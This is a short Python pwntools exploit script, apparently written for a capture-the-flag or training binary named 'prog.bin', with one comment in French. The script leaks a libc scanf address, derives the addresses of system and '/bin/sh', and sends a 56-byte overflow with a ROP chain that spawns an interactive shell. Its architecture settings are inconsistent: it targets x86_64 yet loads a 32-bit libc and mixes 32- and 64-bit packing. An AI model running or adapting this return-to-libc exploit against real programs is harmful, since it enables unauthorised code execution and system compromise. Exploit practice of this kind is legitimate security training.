#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='x86_64')
p = 0
b = ELF('./prog.bin')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour conna√Ætre le chemin de votre libc

DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
    global p, libc, b
    if p is not 0:
        p.close()
    p = process('./prog.bin')
    wait("login")


pr = 0x0000000000400a13  #: pop ebx ; ret

padding="a"*56
start()
ropchain="salut" #login
p.sendline(ropchain)
leak=wait('pass')
leak_scanf = u32(leak[2:6])
leak_system = leak_scanf - libc.symbols['__isoc99_scanf'] + libc.symbols['system']
leak_binsh = leak_scanf - libc.symbols['__isoc99_scanf'] + next(libc.search('/bin/sh\x00'))

log.info("Gadget: "+str(hex(pr)))
log.info("Leak got scanf: "+str(hex(leak_scanf)))
log.info("Leak system: "+str(hex(leak_system)))
log.info("Leak /bin/sh: "+str(hex(leak_binsh)))
log.info("Get shell")
ropchain=padding+p64(pr)+p64(leak_binsh)+p64(leak_system)
p.sendline(ropchain)
# Interactive shell
p.interactive()
